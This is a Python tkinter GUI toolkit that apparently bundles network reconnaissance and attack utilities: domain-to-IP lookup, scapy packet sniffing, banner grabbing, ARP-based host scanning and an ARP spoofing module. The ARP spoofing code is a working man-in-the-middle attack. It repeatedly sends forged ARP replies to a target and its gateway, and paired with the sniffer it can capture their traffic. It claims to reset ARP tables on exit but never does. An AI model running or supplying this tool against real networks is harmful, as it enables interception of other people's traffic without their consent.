'''TOOLKIT OPTIONS:
1. IP Address & Domain Analysis
2. Packet Sniffing
3. Banner Grabbing
4. ARP Spoofing
5. WiFi Scanning'''

'''import tkinter as tk
import scapy.all as sc
import argparse
import socket
import time
import sys
import re
from scapy.layers import http
from scapy.all import *

#IP Address & Domain Analysis
def open_ip_domain_window():
    ip_domain_window = tk.Toplevel(root)
    ip_domain_window.title("IP Address & Domain Analysis")

    def save_values():
        fulladdr = f"www.{website_entry.get()}.{tld_entry.get()}"
        ipaddr = socket.gethostbyname(fulladdr)  # You can implement a function to get IP address from domain
        result_label.config(text=f"IP Address: {ipaddr}\nDomain Name: {fulladdr}")
        return result_label

    website_label = tk.Label(ip_domain_window, text="Website Name:")
    website_label.grid(row=0, column=0, padx=10, pady=5)
    website_entry = tk.Entry(ip_domain_window)
    website_entry.grid(row=0, column=1, padx=10, pady=5)

    tld_label = tk.Label(ip_domain_window, text="Top Level Domain:")
    tld_label.grid(row=1, column=0, padx=10, pady=5)
    tld_entry = tk.Entry(ip_domain_window)
    tld_entry.grid(row=1, column=1, padx=10, pady=5)

    save_button = tk.Button(ip_domain_window, text="Save", command=save_values)
    save_button.grid(row=2, column=0, columnspan=2, pady=10)

    result_label = tk.Label(ip_domain_window, text="")
    result_label.grid(row=3, column=0, columnspan=2, pady=5)

#Packet Sniffing
def packet_sniffing():
    def start_sniffing():
        try:
            count = int(packet_count_entry.get())
            result_text.delete('1.0', tk.END)  # Clear previous output
            result_text.insert(tk.END, packet_sniff(count))
        except ValueError:
            result_text.delete('1.0', tk.END)  # Clear previous output
            result_text.insert(tk.END, "Invalid input. Please enter a valid number.")

    def packet_sniff(count):
        try:
            pack = ""
            packets = sniff(count=count)
            for packet in packets:
                pack += str(packet) + "\n"
            return pack
        except Exception as e:
            return f"Error: {e}"

    # Create a new window for packet sniffing
    packet_sniffing_window = tk.Toplevel(root)
    packet_sniffing_window.title("Packet Sniffing")

    packet_sniffing_window.geometry("880x500")

    # Create and place GUI elements
    packet_count_label = tk.Label(packet_sniffing_window, text="Enter number of packets to sniff:")
    packet_count_label.pack(padx=5, pady=5)
    packet_count_entry = tk.Entry(packet_sniffing_window)
    packet_count_entry.pack(padx=5, pady=5)

    start_btn = tk.Button(packet_sniffing_window, text="Start Sniffing", command=start_sniffing)
    start_btn.pack(padx=5, pady=5)

    # Create a frame to hold the text widget and scrollbar
    output_frame = tk.Frame(packet_sniffing_window)
    output_frame.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)

    # Create a vertical scrollbar
    scrollbar = tk.Scrollbar(output_frame, orient=tk.VERTICAL)

    # Create a text widget to display output
    result_text = tk.Text(output_frame, wrap=tk.NONE, yscrollcommand=scrollbar.set)
    result_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

#Banner Grabbing
def banner_grabbing_main():
    def open_banner_grabbing_window():
        banner_window = tk.Toplevel(root)
        banner_window.title("Banner Grabbing")

        def grab_banner():
            target = target_entry.get()
            port = int(port_entry.get())
            banner = banner_grabbing(target, port)
            result_label.config(text=banner)

        target_label = tk.Label(banner_window, text="Target IP Address (example: 128.199.26.61):")
        target_label.grid(row=0, column=0, padx=10, pady=5)
        target_entry = tk.Entry(banner_window)
        target_entry.grid(row=0, column=1, padx=10, pady=5)

        port_label = tk.Label(banner_window, text="Port (example: 22):")
        port_label.grid(row=1, column=0, padx=10, pady=5)
        port_entry = tk.Entry(banner_window)
        port_entry.grid(row=1, column=1, padx=10, pady=5)

        grab_button = tk.Button(banner_window, text="Grab Banner", command=grab_banner)
        grab_button.grid(row=2, column=0, columnspan=2, pady=10)

        result_label = tk.Label(banner_window, text="")
        result_label.grid(row=3, column=0, columnspan=2, pady=5)

    def banner_grabbing(target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Set a timeout for the connection attempt
            s.connect((target, port))
            banner = s.recv(1024)
            s.settimeout(2)
            return banner.decode().strip()
        except Exception as e:
            return f"Error: {e}"
        finally:
            s.close()

    open_banner_grabbing_window()

# ARP Spoofing
# ARP Spoofing
def arp_spoofing_main():
    arp_spoof_process = None  # Global variable to hold the ARP spoofing process

    def open_arp_spoofing_window():
        nonlocal arp_spoof_process

        arp_window = tk.Toplevel(root)
        arp_window.title("ARP Spoofing")
        arp_window.geometry("480x350")

        def spoof_arp(output_text):
            nonlocal arp_spoof_process
            target_ip = target_entry.get()
            gateway_ip = gateway_entry.get()
            try:
                while True:
                    spoof(target_ip, gateway_ip, output_text)
                    spoof(gateway_ip, target_ip, output_text)
                    time.sleep(2)
                    output_text.insert(tk.END, "[+] Packets sent\n")
                    output_text.see(tk.END)
                    if arp_spoof_process is None:
                        break
            except KeyboardInterrupt:
                output_text.insert(tk.END, "\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n")
                output_text.see(tk.END)
                sys.exit(0)

        def stop_spoofing():
            nonlocal arp_spoof_process
            arp_spoof_process = None

        target_label = tk.Label(arp_window, text="Target IP Address (example: 192.168.1.14):")
        target_label.grid(row=0, column=0, padx=10, pady=5)
        target_entry = tk.Entry(arp_window)
        target_entry.grid(row=0, column=1, padx=10, pady=5)

        gateway_label = tk.Label(arp_window, text="Gateway IP Address (example: 192.168.1.254):")
        gateway_label.grid(row=1, column=0, padx=10, pady=5)
        gateway_entry = tk.Entry(arp_window)
        gateway_entry.grid(row=1, column=1, padx=10, pady=5)

        output_text = tk.Text(arp_window, height=10, width=55)
        output_text.grid(row=2, column=0, columnspan=2, padx=10, pady=5)

        spoof_button = tk.Button(arp_window, text="Start ARP Spoofing", command=lambda: spoof_arp(output_text))
        spoof_button.grid(row=3, column=0, columnspan=2, pady=10)

        exit_button = tk.Button(arp_window, text="Stop", command=stop_spoofing)
        exit_button.grid(row=4, column=0, columnspan=2, pady=10)

    def spoof(target_ip, spoof_ip, output_text):
        target_mac = get_mac(target_ip)
        if target_mac:
            packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            sc.send(packet, verbose=False)
        else:
            output_text.insert(tk.END, f"[-] Failed to get target MAC address for {target_ip}\n")
            output_text.see(tk.END)

    def get_mac(ip):
        arp_packet = sc.ARP(pdst=ip)
        broadcast_packet = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = sc.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None

    open_arp_spoofing_window()

#WiFi Scanning
def wifi_scanning():
    def start_scan():
        ip_add_range_entered = ip_entry.get()
        ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")

        if ip_add_range_pattern.search(ip_add_range_entered):
            output_text.delete(1.0, tk.END)  # Clear previous output
            output_text.insert(tk.END, f"{ip_add_range_entered} is a valid IP address range.\n")
            output_text.see(tk.END)

            try:
                arp_result = sc.arping(ip_add_range_entered, verbose=False, timeout=1)
                
                # Check if arp_result is empty or None
                if arp_result:
                    for received in arp_result:
                        if stop_scan:
                            break
                        if received and received[0] and received[0][1]:
                            ip = received[0][1].psrc
                            mac = received[0][1].hwsrc
                            try:
                                hostname, _, _ = socket.gethostbyaddr(ip)
                            except socket.herror:
                                hostname = "Unknown"
                            output_text.insert(tk.END, f"IP: {ip} MAC: {mac} Hostname: {hostname}\n")
                            output_text.see(tk.END)
                else:
                    output_text.insert(tk.END, "No ARP responses received.\n")
                    output_text.see(tk.END)
            except Exception as e:
                output_text.insert(tk.END, f"An error occurred: {str(e)}\n")
                output_text.see(tk.END)
        else:
            output_text.insert(tk.END, f"Invalid IP address and range format: {ip_add_range_entered}\n")
            output_text.see(tk.END)

    def end_scan():
        global stop_scan
        stop_scan = True

    # Create the window for WiFi scanning
    wifi_window = tk.Toplevel(root)
    wifi_window.title("WiFi Scanning")

    # Set window dimensions
    wifi_window.geometry("560x320")

    # IP address entry
    ip_label = tk.Label(wifi_window, text="IP Address and Range (ex: 192.168.1.0/24):")
    ip_label.pack(pady=5)
    ip_entry = tk.Entry(wifi_window)
    ip_entry.pack(pady=5)

    # Output text area
    output_text = tk.Text(wifi_window, height=10, width=60)
    output_text.pack(pady=10)

    # Start scan button
    start_scan_button = tk.Button(wifi_window, text="Start Scan", command=start_scan)
    start_scan_button.pack(pady=5)

    # End scan button
    end_scan_button = tk.Button(wifi_window, text="End Scan", command=end_scan)
    end_scan_button.pack(pady=5)

    # Global variable to control scanning process
    global stop_scan
    stop_scan = False

# Create the main window
root = tk.Tk()

# Set window title
root.title("TOOLKIT")

# Set window dimensions
root.geometry("400x300")

# Welcome message
welcome_label = tk.Label(root, text="Welcome to TOOLKIT", font=("Helvetica", 16))
welcome_label.pack(pady=10)

# Prompt message
prompt_label = tk.Label(root, text="Please select one of the options below:")
prompt_label.pack()

# Button for IP Address & Domain Analysis
ip_domain_button = tk.Button(root, text="IP Address & Domain Analysis", command=open_ip_domain_window)
ip_domain_button.pack(pady=5)

# Button for Packet Sniffing
packet_sniffing_button = tk.Button(root, text="Packet Sniffing", command=packet_sniffing)
packet_sniffing_button.pack(pady=5)

# Button for banner Grabbing
packet_sniffing_button = tk.Button(root, text="Banner Grabbing", command=banner_grabbing_main)
packet_sniffing_button.pack(pady=5)

# Button for ARP Spoofing
packet_sniffing_button = tk.Button(root, text="ARP Spoofing", command=arp_spoofing_main)
packet_sniffing_button.pack(pady=5)

# Button for WiFi Scanning
wifi_scanning_button = tk.Button(root, text="WiFi Scanning", command=wifi_scanning)
wifi_scanning_button.pack(pady=5)

# Start the event loop
root.mainloop()
'''

import tkinter as tk
from ip_domain_analysis import open_ip_domain_window
from packet_sniffing import packet_sniffing
from banner_grabbing import banner_grabbing_main
from arp_spoofing import arp_spoofing_main
from wifi_scanning import wifi_scanning

# Create the main window
root = tk.Tk()

# Set window dimensions
root.geometry("400x300")

# Welcome message
welcome_label = tk.Label(root, text="Welcome to TOOLKIT", font=("Helvetica", 16))
welcome_label.pack(pady=10)

# Prompt message
prompt_label = tk.Label(root, text="Please select one of the options below:")
prompt_label.pack()

# Button for IP Address & Domain Analysis
ip_domain_button = tk.Button(root, text="IP Address & Domain Analysis", command=lambda: open_ip_domain_window(root))
ip_domain_button.pack(pady=5)

# Button for Packet Sniffing
packet_sniffing_button = tk.Button(root, text="Packet Sniffing", command=lambda: packet_sniffing(root))
packet_sniffing_button.pack(pady=5)

# Button for banner Grabbing
packet_sniffing_button = tk.Button(root, text="Banner Grabbing", command=lambda: banner_grabbing_main(root))
packet_sniffing_button.pack(pady=5)

# Button for ARP Spoofing
packet_sniffing_button = tk.Button(root, text="ARP Spoofing", command=lambda: arp_spoofing_main(root))
packet_sniffing_button.pack(pady=5)

# Button for WiFi Scanning
wifi_scanning_button = tk.Button(root, text="WiFi Scanning", command=lambda: wifi_scanning(root))
wifi_scanning_button.pack(pady=5)

# Start the event loop
root.mainloop()
